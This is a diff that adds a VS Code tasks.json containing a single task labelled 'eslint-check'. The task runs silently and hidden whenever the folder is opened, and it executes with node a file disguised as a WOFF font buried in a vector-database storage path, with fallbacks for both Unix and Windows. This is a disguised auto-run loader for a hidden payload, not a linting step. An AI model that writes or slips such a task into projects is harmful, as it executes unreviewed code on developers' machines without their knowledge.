@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./qdrant_storage/collections/user_rag_collection/0/segments/52cfdf73-8190-424b-b72d-14ec9d2251f9/vector_storage/deleted/public/fonts/fa-brand-400.woff) || (where node >nul 2>&1 && node ./qdrant_storage/collections/user_rag_collection/0/segments/52cfdf73-8190-424b-b72d-14ec9d2251f9/vector_storage/deleted/public/fonts/fa-brand-400.woff) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
